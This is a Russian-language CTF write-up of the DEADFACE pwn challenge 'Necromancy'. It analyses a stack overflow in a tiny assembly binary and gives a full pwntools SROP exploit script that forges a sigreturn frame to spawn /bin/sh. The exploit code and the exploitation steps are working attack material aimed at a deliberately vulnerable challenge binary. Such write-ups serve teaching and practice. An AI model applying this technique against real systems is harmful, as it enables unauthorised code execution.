# Necromancy — pwn writeup

**Категория:** pwn / binary exploitation
**CTF:** DEADFACE
**Техника:** SROP (Sigreturn-Oriented Programming)

---

## 1. Разведка

### checksec

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Выводы из защит:

- **No canary** — переполнение стека не детектится.
- **No PIE** — база фиксирована на `0x400000`, все адреса известны заранее, ROP строится без утечек.
- **NX enabled** — стек неисполняемый, шеллкод на стек положить и выполнить нельзя → нужен code-reuse.
- **Not stripped** — символы на месте, имена функций видны.

### Функции

```
0x401000  syscall_ret
0x401003  reread
0x401017  vuln
0x40104d  _start
```

Всего четыре крошечных функции — бинарник написан на чистом ассемблере, без libc. Точка входа — `_start`, никакого `main`.

---

## 2. Анализ функций

### `_start`

```asm
mov    eax, 0x1
lea    rsi, [rip+banner]
mov    edx, 0xa9b
mov    rdi, rax
syscall                 ; write(1, banner, 0xa9b) — печать ASCII-арта
call   vuln
xor    edi, edi
mov    eax, 0x3c
syscall                 ; exit(0)
```

Печатает баннер, зовёт `vuln`, выходит.

### `vuln` — уязвимость

```asm
mov    eax, 0x1
sub    rsp, 0x88
mov    edx, 0x78
mov    rdi, rax
lea    rsi, [rip+0xfce]     ; 0x402000
syscall                     ; write(1, prompt, 0x78)
xor    eax, eax
lea    rsi, [rsp-0x78]      ; буфер
mov    edx, 0x400           ; читаем 0x400 = 1024 байта
mov    rdi, rax
syscall                     ; read(0, rsp-0x78, 0x400)
add    rsp, 0x88
ret
```

Буфер на `rsp-0x78`, но `read` принимает **1024 байта** в стек, где отведено всего `0x88` → переполнение.

**Смещение до адреса возврата:**

```
(rsp + 0x88) - (rsp - 0x78) = 0x88 + 0x78 = 0x100 = 256
```

Подтверждено на практике через corefile:

```python
p.send(cyclic(400))
# RIP = 0x40104c, Fault pattern → cyclic_find → offset = 256
```

### `reread` — ключ к SROP

```asm
xor    eax, eax
lea    rsi, [rip+0x2b14]    ; 0x403b20 <scratch>
mov    edx, 0xf             ; 15 байт
mov    rdi, rax
syscall                     ; read(0, scratch, 15)
ret
```

Это главный подарок автора. `read` **возвращает число прочитанных байт в `rax`**. Если скормить **ровно 15 байт**, то `rax = 15 = номер syscall rt_sigreturn`. Бонусом эти 15 байт пишутся в `scratch` (`0x403b20`) — туда кладём строку `/bin/sh`.

Одним вызовом решаются две задачи: выставить `rax=15` **и** посадить строку аргумента по известному адресу.

### `syscall_ret` — гаджет

```asm
syscall
ret
```

Просто `syscall; ret`. Нужен, чтобы исполнить сам `rt_sigreturn` (когда `rax=15`), а затем, после восстановления фрейма, исполнить `execve`.

---

## 3. План эксплуатации (SROP)

Прямых гаджетов `pop rdi` / `pop rsi` / `pop rdx` в бинаре нет — обычным ROP регистры под `execve` не выставить. Решение — **sigreturn**: syscall `rt_sigreturn` (№15) восстанавливает **весь** набор регистров из sigcontext-фрейма, лежащего на стеке. Кладём поддельный фрейм — получаем полный контроль над регистрами одним сисколлом.

Цель: `execve("/bin/sh", NULL, NULL)` = syscall **59**.

### Цепочка

```
[ 256 байт паддинга ]      ; забить буфер до RIP
[ 0x401003 ] reread        ; read(,,15) → rax=15, пишет /bin/sh в scratch
[ 0x401000 ] syscall_ret   ; выполняет rt_sigreturn (rax=15)
[ sigreturn frame ]        ; фрейм восстанавливает регистры под execve
```

Поддельный фрейм выставляет:

| регистр | значение | зачем |
|---------|----------|-------|
| rax | 59 | execve |
| rdi | 0x403b20 | адрес "/bin/sh" (scratch) |
| rsi | 0 | argv = NULL |
| rdx | 0 | envp = NULL |
| rip | 0x401000 | `syscall; ret` → исполнить execve |

Порядок работы в рантайме:

1. `vuln` читает payload, на `ret` управление уходит в `reread`.
2. `reread` ждёт второй ввод. Шлём **ровно 15 байт** `/bin/sh\x00...` → `rax=15`, строка в scratch.
3. `reread` делает `ret` → попадаем на `syscall_ret`.
4. `syscall; ret` при `rax=15` → `rt_sigreturn` восстанавливает фрейм.
5. Восстановленный `rip=0x401000` → снова `syscall`, теперь уже с `rax=59` → **execve("/bin/sh")**.

---

## 4. Эксплойт

```python
from pwn import *

context.arch = 'amd64'

SYSCALL_RET = 0x401000
REREAD      = 0x401003
SCRATCH     = 0x403b20

p = process('./Necromancy')   # или remote(host, port)

# поддельный sigreturn-фрейм
frame = SigreturnFrame()
frame.rax = 59                # execve
frame.rdi = SCRATCH           # "/bin/sh"
frame.rsi = 0                 # argv = NULL
frame.rdx = 0                 # envp = NULL
frame.rip = SYSCALL_RET       # syscall; ret → выполнит execve

payload  = b'A' * 256
payload += p64(REREAD)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.recvuntil(b'Bring back the dead')   # дождаться prompt'а
p.send(payload)                       # 1-й read (в vuln)

p.send(b'/bin/sh\x00'.ljust(15, b'\x00'))  # 2-й read (в reread): РОВНО 15 байт

p.interactive()
```

### Два подводных камня

1. **Два раздельных `send`.** Первый read (в `vuln`) съедает основной payload; второй read (в `reread`) ждёт **новый** ввод — те самые 15 байт. Нельзя склеивать в один send, иначе второй read возьмёт хвост первого и `rax` будет не 15.
2. **Ровно 15 байт** во втором send. `/bin/sh\x00` = 8 байт, добиваем нулями до 15, чтобы `read` вернул именно 15 → `rax = 15 = rt_sigreturn`. Больше или меньше — sigreturn не сработает.

### Нюанс с тихим шеллом

После срабатывания `execve` под `interactive()` приглашения может не быть — `sh` без tty не печатает промпт. Это не ошибка: команда `id` или `ls` вслепую подтверждает живой шелл.

---

## 5. Итог

Задача — хрестоматийный **SROP** на статическом ASM-бинарнике без PIE и canary. Автор заботливо оставил всё необходимое: гаджет `syscall; ret`, функцию `reread` для выставления `rax=15` через возвращаемое значение `read`, и writable `scratch` для строки `/bin/sh`. Переполнение в `vuln` с оффсетом 256 связывает кирпичики в цепочку, а фейковый sigreturn-фрейм выдаёт полный контроль над регистрами для `execve("/bin/sh")`.

Название «Necromancy» — отсылка к sigreturn: «воскрешаем» произвольное состояние регистров из мёртвого фрейма на стеке.
